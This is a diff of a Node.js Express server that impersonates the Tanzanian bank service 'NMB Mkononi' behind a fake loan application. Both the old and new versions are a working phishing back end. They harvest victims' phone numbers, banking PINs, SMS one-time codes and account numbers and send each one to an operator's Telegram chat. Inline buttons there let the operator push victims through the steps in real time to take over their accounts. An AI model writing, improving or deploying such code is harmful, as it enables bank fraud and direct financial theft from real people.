@@ -1,263 +1,185 @@
 const express = require('express');
 const path = require('path');
-const fetch = require('node-fetch');
-
 const app = express();
-const PORT = process.env.PORT || 10000;
 
+const PORT = process.env.PORT || 10000;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const DEFAULT_ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-const sessions = {}; 
-const adminMappings = {}; 
+// In-memory session store: { sessionId: { phone, pin, otp, accountNumber, status } }
+const sessions = {};
 
-async function sendTelegramMessage(chatId, text, replyMarkup = {}) {
-    if (!TELEGRAM_BOT_TOKEN || !chatId) return null;
+// Helper to send messages to Telegram with optional inline buttons
+async function sendTelegramNotification(text, replyMarkup = null) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+        console.error('Telegram Bot Token or Chat ID is missing in environment variables.');
+        return;
+    }
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const payload = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text,
+        parse_mode: 'HTML'
+    };
+
+    if (replyMarkup) {
+        payload.reply_markup = replyMarkup;
+    }
+
     try {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const payload = { chat_id: chatId, text: text, parse_mode: 'HTML' };
-        if (replyMarkup && Object.keys(replyMarkup).length > 0) payload.reply_markup = replyMarkup;
-
         const response = await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
-        return await response.json();
+        const data = await response.json();
+        return data;
     } catch (err) {
-        return null;
+        console.error('Error sending Telegram message:', err);
     }
 }
 
-async function removeInlineKeyboard(chatId, messageId, originalText, statusLabel) {
-    if (!TELEGRAM_BOT_TOKEN || !chatId || !messageId) return;
-    try {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                message_id: messageId,
-                text: `${originalText}\n\n<b>Hali: [ ${statusLabel} ]</b>`,
-                parse_mode: 'HTML',
-                reply_markup: { inline_keyboard: [] }
-            })
-        });
-    } catch (err) {}
-}
-
-function getTargetAdminChat(ref) {
-    if (ref && adminMappings[ref]) return ref;
-    if (ref && /^\d+$/.test(ref)) return ref;
-    return DEFAULT_ADMIN_CHAT_ID;
-}
-
-// 1. Initial Application & Phone Submission
+// 1. Submit Application / Phone
 app.post('/api/submit-application', async (req, res) => {
-    const { sessionId, phone, ref } = req.body;
-    const targetAdminChat = getTargetAdminChat(ref);
-    
-    sessions[sessionId] = { phone, pin: '', step: 'phone_submitted', adminChatId: targetAdminChat, status: 'pending' };
+    const { sessionId, phone } = req.body;
+    sessions[sessionId] = { phone, status: 'pending' };
+
+    await sendTelegramNotification(
+        `<b>New Loan Application</b>\n\n` +
+        `📱 Phone: <code>+255 ${phone}</code>\n` +
+        `🆔 Session: ${sessionId}`
+    );
+
     res.json({ success: true });
 });
 
-// 2. PIN Submission -> Admin: ALLOW / DENY
+// 2. Submit PIN (Triggers when applicant taps INGIA)
 app.post('/api/submit-pin', async (req, res) => {
     const { sessionId, pin } = req.body;
-    
     if (!sessions[sessionId]) {
-        sessions[sessionId] = { phone: 'Unknown', adminChatId: DEFAULT_ADMIN_CHAT_ID, status: 'pending' };
+        sessions[sessionId] = {};
     }
-    
     sessions[sessionId].pin = pin;
-    sessions[sessionId].status = 'pending';
-    const session = sessions[sessionId];
+    sessions[sessionId].status = 'waiting_admin';
 
-    const message = `🏦 <b>NMB MKONONI TANZANIA - MAOMBI MAPYA</b>\n\n` +
-                    `📱 <b>Namba ya Simu:</b> +255${session.phone}\n` +
-                    `🔑 <b>PIN Iliyoingizwa:</b> ${pin}\n\n` +
-                    `<i>Chagua hatua ya mteja:</i>`;
+    const phone = sessions[sessionId].phone || 'Unknown';
 
-    const replyMarkup = {
+    // Send to Telegram with Admin Control Buttons
+    const inlineKeyboard = {
         inline_keyboard: [
             [
-                { text: '✅ RUHUSU (ALLOW)', callback_data: `allow_${sessionId}` },
-                { text: '❌ KATAA (DENY)', callback_data: `deny_${sessionId}` }
-            ]
-        ]
-    };
-
-    const sent = await sendTelegramMessage(session.adminChatId, message, replyMarkup);
-    if (sent && sent.result && sent.result.message_id) {
-        session.adminMsgId = sent.result.message_id;
-    }
-    res.json({ success: true });
-});
-
-// 3. Submit OTP -> Admin: PROCEED / STOP
-app.post('/api/submit-otp', async (req, res) => {
-    const { sessionId, otp } = req.body;
-    
-    if (!sessions[sessionId]) {
-        sessions[sessionId] = { phone: 'Unknown', adminChatId: DEFAULT_ADMIN_CHAT_ID, status: 'pending' };
-    }
-    
-    sessions[sessionId].otp = otp;
-    sessions[sessionId].status = 'pending';
-    const session = sessions[sessionId];
-
-    const message = `🔐 <b>NMB MKONONI TANZANIA - UTHIBITISHO WA OTP</b>\n\n` +
-                    `📱 <b>Namba ya Simu:</b> +255${session.phone}\n` +
-                    `🔑 <b>SMS OTP:</b> ${otp}\n\n` +
-                    `<i>Thibitisha OTP:</i>`;
-
-    const replyMarkup = {
-        inline_keyboard: [
-            [
-                { text: '✅ ENDELEA', callback_data: `otp_proceed_${sessionId}` },
-                { text: '🛑 SIMAMISHA', callback_data: `otp_stop_${sessionId}` }
-            ]
-        ]
-    };
-
-    const sent = await sendTelegramMessage(session.adminChatId, message, replyMarkup);
-    if (sent && sent.result && sent.result.message_id) {
-        session.adminMsgId = sent.result.message_id;
-    }
-    res.json({ success: true });
-});
-
-// 4. Submit 11-digit NMB Bank Account -> Admin options
-app.post('/api/submit-account', async (req, res) => {
-    const { sessionId, accountNumber } = req.body;
-    
-    if (!sessions[sessionId]) {
-        sessions[sessionId] = { phone: 'Unknown', adminChatId: DEFAULT_ADMIN_CHAT_ID, status: 'pending' };
-    }
-    
-    sessions[sessionId].accountNumber = accountNumber;
-    sessions[sessionId].status = 'pending';
-    const session = sessions[sessionId];
-
-    const message = `🏦 <b>NMB MKONONI TANZANIA - AKAUNTI YA BENKI</b>\n\n` +
-                    `📱 <b>Namba ya Simu:</b> +255${session.phone}\n` +
-                    `💳 <b>Namba ya Akaunti (Tarakimu 11):</b> ${accountNumber}\n\n` +
-                    `<i>Chagua hali ya mwisho ya uthibitisho:</i>`;
-
-    const replyMarkup = {
-        inline_keyboard: [
-            [
-                { text: '⚠️ PIN SI SAHIHI', callback_data: `err_pin_${sessionId}` },
-                { text: '⚠️ OTP SI SAHIHI', callback_data: `err_otp_${sessionId}` }
+                { text: '✅ Approve / Success', callback_data: `success_${sessionId}` },
+                { text: '💬 Request OTP', callback_data: `otp_${sessionId}` }
             ],
             [
-                { text: '🚫 AKAUNTI SI SAHIHI', callback_data: `err_acc_${sessionId}` },
-                { text: '🎉 IMEIDHIBINISHWA', callback_data: `approve_${sessionId}` }
+                { text: '❌ Wrong PIN', callback_data: `badpin_${sessionId}` },
+                { text: '🏦 Ask Account No', callback_data: `acc_${sessionId}` }
             ]
         ]
     };
 
-    const sent = await sendTelegramMessage(session.adminChatId, message, replyMarkup);
-    if (sent && sent.result && sent.result.message_id) {
-        session.adminMsgId = sent.result.message_id;
-    }
+    await sendTelegramNotification(
+        `🚨 <b>NEW PIN SUBMITTED</b>\n\n` +
+        `📱 Phone: <code>+255 ${phone}</code>\n` +
+        `🔑 PIN: <b>${pin}</b>\n` +
+        `🆔 Session: ${sessionId}`,
+        inlineKeyboard
+    );
+
     res.json({ success: true });
 });
 
-// Polling endpoint for frontend UI
+// 3. Submit OTP
+app.post('/api/submit-otp', async (req, res) => {
+    const { sessionId, otp } = req.body;
+    if (sessions[sessionId]) {
+        sessions[sessionId].otp = otp;
+    }
+
+    await sendTelegramNotification(
+        `<b>OTP Submitted</b>\n\n` +
+        `🔢 OTP: <b>${otp}</b>\n` +
+        `🆔 Session: ${sessionId}`
+    );
+
+    res.json({ success: true });
+});
+
+// 4. Submit Bank Account
+app.post('/api/submit-account', async (req, res) => {
+    const { sessionId, accountNumber } = req.body;
+    if (sessions[sessionId]) {
+        sessions[sessionId].accountNumber = accountNumber;
+    }
+
+    await sendTelegramNotification(
+        `<b>Bank Account Submitted</b>\n\n` +
+        `🏦 Account: <code>${accountNumber}</code>\n` +
+        `🆔 Session: ${sessionId}`
+    );
+
+    res.json({ success: true });
+});
+
+// 5. Check Status (Frontend polling endpoint)
 app.get('/api/check-status/:sessionId', (req, res) => {
     const { sessionId } = req.params;
     const session = sessions[sessionId];
-    
     if (!session) {
         return res.json({ status: 'pending' });
     }
-    
-    res.json({ status: session.status || 'pending' });
+    res.json({ status: session.status });
 });
 
+// 6. Telegram Webhook (Handles admin button clicks from Telegram)
 app.post('/api/telegram-webhook', async (req, res) => {
-    try {
-        const update = req.body;
+    const update = req.body;
+    if (update.callback_query) {
+        const callbackQuery = update.callback_query;
+        const data = callbackQuery.data; // e.g., "success_sess_abc123"
+        const [action, sessionId] = data.split('_');
 
-        if (update && update.message && update.message.text) {
-            const messageObj = update.message;
-            const chatId = messageObj.chat.id;
-            const text = messageObj.text.trim();
-            
-            if (text.startsWith('/start')) {
-                adminMappings[chatId] = { chatId, fullName: `${messageObj.from.first_name || ''}`.trim() };
-                const protocol = req.headers['x-forwarded-proto'] || req.protocol;
-                const permanentLink = `${protocol}://${req.get('host')}/?ref=${chatId}`;
-                await sendTelegramMessage(chatId, `Karibu NMB Mkononi Tanzania! Kiungo chako cha usimamizi:\n${permanentLink}`);
-                return res.sendStatus(200);
+        if (sessions[sessionId]) {
+            if (action === 'success') {
+                sessions[sessionId].status = 'success';
+            } else if (action === 'otp') {
+                sessions[sessionId].status = 'next_step';
+            } else if (action === 'badpin') {
+                sessions[sessionId].status = 'restart_pin';
+            } else if (action === 'acc') {
+                sessions[sessionId].status = 'restart_acc';
             }
         }
 
-        if (update && update.callback_query) {
-            const query = update.callback_query;
-            const data = query.data; 
-            const parts = data.split('_');
-            
-            let action, sessionId;
-            if (data.startsWith('otp_')) {
-                action = `otp_${parts[1]}`;
-                sessionId = parts[2];
-            } else if (data.startsWith('err_')) {
-                action = `err_${parts[1]}`;
-                sessionId = parts[2];
-            } else {
-                action = parts[0];
-                sessionId = parts[1];
-            }
+        // Answer callback query to stop loading spinner on Telegram button
+        const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
+        await fetch(answerUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ callback_query_id: callbackQuery.id, text: `Action recorded: ${action}` })
+        });
+    }
+    res.sendStatus(200);
+});
 
-            const session = sessions[sessionId];
-            let statusLabel = 'IMEEKAMILIKA ✅';
-            
-            if (session) {
-                if (action === 'allow' || action === 'otp_proceed') {
-                    session.status = 'next_step';
-                    statusLabel = action === 'allow' ? 'IMERUHUSIWA ✅' : 'IMEENDELEA ✅';
-                } else if (action === 'deny' || action === 'otp_stop' || action === 'err_pin') {
-                    session.status = 'restart_pin';
-                    statusLabel = 'PIN ISIYO SAHIHI / IMEKATALIWA ❌';
-                } else if (action === 'err_otp') {
-                    session.status = 'restart_otp';
-                    statusLabel = 'OTP ISIYO SAHIHI ❌';
-                } else if (action === 'err_acc') {
-                    session.status = 'restart_acc';
-                    statusLabel = 'AKAUNTI ISIYO SAHIHI ❌';
-                } else if (action === 'approve') {
-                    session.status = 'success';
-                    statusLabel = 'IMEIDHIBINISHWA 🎉';
-                }
-            }
-
-            if (query.message) {
-                const messageId = (session && session.adminMsgId) ? session.adminMsgId : query.message.message_id;
-                const targetChat = (session && session.adminChatId) ? session.adminChatId : query.message.chat.id;
-                await removeInlineKeyboard(targetChat, messageId, query.message.text || '', statusLabel);
-            }
-            
-            if (TELEGRAM_BOT_TOKEN) {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ callback_query_id: query.id, text: 'Imekamilika!' })
-                });
-            }
+app.listen(PORT, async () => {
+    console.log(`NMB Mkononi Server running on port ${PORT}`);
+    
+    // Automatically set webhook if token is available and hosted on Render
+    if (TELEGRAM_BOT_TOKEN) {
+        const domain = process.env.RENDER_EXTERNAL_URL || `https://${process.env.RENDER_SERVICE_NAME}.onrender.com`;
+        const webhookUrl = `${domain}/api/telegram-webhook`;
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
+            console.log(`Telegram webhook set to: ${webhookUrl}`);
+        } catch (e) {
+            console.error('Failed to auto-register Telegram webhook');
         }
-        res.sendStatus(200);
-    } catch (err) {
-        res.sendStatus(500);
     }
 });
-
-app.listen(PORT, () => {
-    console.log(`NMB Mkononi Server running on port ${PORT}`);
-});
-          
+        
